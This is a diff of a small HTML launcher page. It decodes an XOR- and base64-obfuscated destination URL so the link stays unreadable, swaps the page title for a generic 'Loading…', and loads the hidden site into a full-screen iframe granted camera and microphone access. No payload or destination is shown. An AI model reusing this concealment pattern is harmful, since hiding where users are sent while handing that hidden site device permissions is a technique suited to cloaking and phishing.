@@ -2,15 +2,17 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>WorthLens</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Loading…</title>
 <style>
-  body{background:#000;color:#ffb800;font-family:system-ui,-apple-system,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
-  p{opacity:.85;letter-spacing:.02em}
+  html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#000}
+  .loading{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;color:#ffb800;font-family:system-ui,-apple-system,sans-serif;letter-spacing:.02em;background:#000;z-index:0}
+  iframe{position:relative;z-index:1;border:0;width:100vw;height:100vh;height:100dvh;display:block}
 </style>
 </head>
 <body>
-<p>Opening WorthLens…</p>
+<div class="loading">Loading…</div>
+<iframe id="app" title="App" allow="camera; microphone" allowfullscreen></iframe>
 <script>
 (function(){
   // Destination is stored encrypted (XOR + base64) so the link isn't readable in plain text.
@@ -19,9 +21,9 @@
   try {
     var bytes = atob(ENC), url = "";
     for (var i = 0; i < bytes.length; i++) url += String.fromCharCode(bytes.charCodeAt(i) ^ KEY.charCodeAt(i % KEY.length));
-    window.location.replace(url);
+    document.getElementById('app').src = url;
   } catch(e) {
-    document.querySelector('p').textContent = 'Could not open the link.';
+    document.querySelector('.loading').textContent = 'Could not open the link.';
   }
 })();
 </script>
